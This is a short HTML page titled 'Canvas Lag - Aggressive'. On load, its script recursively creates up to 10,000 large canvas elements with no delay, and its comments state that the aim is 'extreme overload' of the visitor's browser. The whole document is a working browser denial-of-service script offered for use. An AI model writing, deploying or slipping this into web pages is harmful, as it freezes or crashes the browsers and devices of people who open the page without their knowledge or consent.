<!DOCTYPE html>
<html>
<head>
  <title>Canvas Lag - Aggressive</title>
</head>
<body>
<script>
function overloadCanvas() {
    let counter = 0;

    function createCanvas() {
        // Create a large number of canvases with smaller sizes for faster creation
        const canvas = document.createElement('canvas');
        canvas.width = 500;  // Small canvas size for faster creation
        canvas.height = 500;
        document.body.appendChild(canvas);

        // Increase the number of canvases to create more strain
        counter++;
        if (counter < 10000) {  // Increase to a larger number for extreme overload
            createCanvas();  // Immediately call again without delay
        }
    }

    createCanvas();  // Start the canvas creation loop
}

overloadCanvas();
</script>
</body>
</html>
